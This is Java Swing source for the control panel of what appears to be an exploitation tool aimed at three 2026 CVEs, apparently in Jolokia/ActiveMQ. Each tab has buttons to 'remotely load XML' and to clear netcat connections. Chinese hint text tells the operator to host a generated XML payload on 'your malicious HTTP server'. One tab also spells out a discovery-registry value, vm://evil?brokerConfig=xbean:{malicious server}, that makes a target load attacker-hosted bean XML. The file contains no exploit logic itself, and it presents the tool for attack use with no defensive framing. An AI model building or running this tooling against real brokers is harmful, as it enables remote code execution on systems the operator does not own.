package cc.kiiy.ui;

import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.border.TitledBorder;
import java.awt.*;
import java.awt.event.ActionListener;

public class JolokiaLoadXmlPanel extends JPanel {

    private JTabbedPane tabbedPane;

    // CVE-2026-34197 Components
    private JButton injectCVE202634197Button;
    private JButton clearNCCVE202634197Button;
    private JTextArea cve202634197ResultArea;

    // CVE-2026-40466 Components
    private JButton injectCVE202640466Button;
    private JButton clearNCCVE202640466Button;
    private JTextArea cve202640466ResultArea;

    // CVE-2026-42588 Components
    private JButton injectCVE202642588Button;
    private JButton clearNCCVE202642588Button;
    private JTextArea cve202642588ResultArea;

    public JolokiaLoadXmlPanel() {
        setLayout(new BorderLayout(10, 10));
        setBorder(new EmptyBorder(10, 10, 10, 10));

        tabbedPane = new JTabbedPane();
        tabbedPane.addTab("CVE-2026-34197", createCVE202634197Panel());
        tabbedPane.addTab("CVE-2026-40466", createCVE202640466Panel());
        tabbedPane.addTab("CVE-2026-42588", createCVE202642588Panel());

        add(tabbedPane, BorderLayout.CENTER);
    }

    private JPanel createCVE202634197Panel() {
        JPanel panel = new JPanel(new BorderLayout(10, 10));
        Font font = new Font("Microsoft YaHei UI", Font.PLAIN, 14);

        clearNCCVE202634197Button = new JButton("清除NC连接");
        clearNCCVE202634197Button.setFont(new Font("Microsoft YaHei UI", Font.BOLD, 14));
        
        injectCVE202634197Button = new JButton("远程加载xml");
        injectCVE202634197Button.setFont(new Font("Microsoft YaHei UI", Font.BOLD, 14));

        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 10, 5));
        buttonPanel.add(clearNCCVE202634197Button);
        buttonPanel.add(injectCVE202634197Button);

        cve202634197ResultArea = new JTextArea(10, 50);
        cve202634197ResultArea.setFont(font);
        cve202634197ResultArea.setEditable(false);
        cve202634197ResultArea.setLineWrap(true);
        cve202634197ResultArea.setWrapStyleWord(true);
        cve202634197ResultArea.setText("提示：请先在“BeanXML生成”面板中生成 XML 载荷，\n并将其部署到你的恶意 HTTP 服务器的根路径下。");

        JPanel resultPanel = new JPanel(new BorderLayout(5, 5));
        resultPanel.setBorder(new TitledBorder("执行输出"));
        resultPanel.add(new JScrollPane(cve202634197ResultArea), BorderLayout.CENTER);

        panel.add(buttonPanel, BorderLayout.NORTH);
        panel.add(resultPanel, BorderLayout.CENTER);

        return panel;
    }

    private JPanel createCVE202640466Panel() {
        JPanel panel = new JPanel(new BorderLayout(10, 10));
        Font font = new Font("Microsoft YaHei UI", Font.PLAIN, 14);

        clearNCCVE202640466Button = new JButton("清除NC连接");
        clearNCCVE202640466Button.setFont(new Font("Microsoft YaHei UI", Font.BOLD, 14));
        
        injectCVE202640466Button = new JButton("远程加载xml");
        injectCVE202640466Button.setFont(new Font("Microsoft YaHei UI", Font.BOLD, 14));

        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 10, 5));
        buttonPanel.add(clearNCCVE202640466Button);
        buttonPanel.add(injectCVE202640466Button);
        
        cve202640466ResultArea = new JTextArea(10, 50);
        cve202640466ResultArea.setFont(font);
        cve202640466ResultArea.setEditable(false);
        cve202640466ResultArea.setLineWrap(true);
        cve202640466ResultArea.setWrapStyleWord(true);
        cve202640466ResultArea.setText("提示：请先在“BeanXML生成”面板中生成 XML 载荷，\n并将其部署到你的恶意 HTTP 服务器的根路径下。\n还需要在恶意 HTTP 服务器下创建一个 /discovery-registry/default 文件，内容为：\nvm://evil?brokerConfig=xbean:{恶意XML服务器地址}");

        JPanel resultPanel = new JPanel(new BorderLayout(5, 5));
        resultPanel.setBorder(new TitledBorder("执行输出"));
        resultPanel.add(new JScrollPane(cve202640466ResultArea), BorderLayout.CENTER);

        panel.add(buttonPanel, BorderLayout.NORTH);
        panel.add(resultPanel, BorderLayout.CENTER);

        return panel;
    }

    private JPanel createCVE202642588Panel() {
        JPanel panel = new JPanel(new BorderLayout(10, 10));
        Font font = new Font("Microsoft YaHei UI", Font.PLAIN, 14);

        clearNCCVE202642588Button = new JButton("清除NC连接");
        clearNCCVE202642588Button.setFont(new Font("Microsoft YaHei UI", Font.BOLD, 14));
        
        injectCVE202642588Button = new JButton("远程加载xml");
        injectCVE202642588Button.setFont(new Font("Microsoft YaHei UI", Font.BOLD, 14));

        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 10, 5));
        buttonPanel.add(clearNCCVE202642588Button);
        buttonPanel.add(injectCVE202642588Button);

        cve202642588ResultArea = new JTextArea(10, 50);
        cve202642588ResultArea.setFont(font);
        cve202642588ResultArea.setEditable(false);
        cve202642588ResultArea.setLineWrap(true);
        cve202642588ResultArea.setWrapStyleWord(true);
        cve202642588ResultArea.setText("提示：请先在“BeanXML生成”面板中生成 XML 载荷，\n并将其部署到你的恶意 HTTP 服务器的根路径下。");

        JPanel resultPanel = new JPanel(new BorderLayout(5, 5));
        resultPanel.setBorder(new TitledBorder("执行输出"));
        resultPanel.add(new JScrollPane(cve202642588ResultArea), BorderLayout.CENTER);

        panel.add(buttonPanel, BorderLayout.NORTH);
        panel.add(resultPanel, BorderLayout.CENTER);

        return panel;
    }

    public void addInjectCVE202634197Listener(ActionListener listener) {
        injectCVE202634197Button.addActionListener(listener);
    }
    
    public void addClearNCCVE202634197Listener(ActionListener listener) {
        clearNCCVE202634197Button.addActionListener(listener);
    }

    public void addInjectCVE202640466Listener(ActionListener listener) {
        injectCVE202640466Button.addActionListener(listener);
    }
    
    public void addClearNCCVE202640466Listener(ActionListener listener) {
        clearNCCVE202640466Button.addActionListener(listener);
    }

    public void addInjectCVE202642588Listener(ActionListener listener) {
        injectCVE202642588Button.addActionListener(listener);
    }
    
    public void addClearNCCVE202642588Listener(ActionListener listener) {
        clearNCCVE202642588Button.addActionListener(listener);
    }

    public void setCVE202634197ResultText(String text) {
        cve202634197ResultArea.setText(text);
    }
    
    public void setCVE202640466ResultText(String text) {
        cve202640466ResultArea.setText(text);
    }

    public void setCVE202642588ResultText(String text) {
        cve202642588ResultArea.setText(text);
    }

}
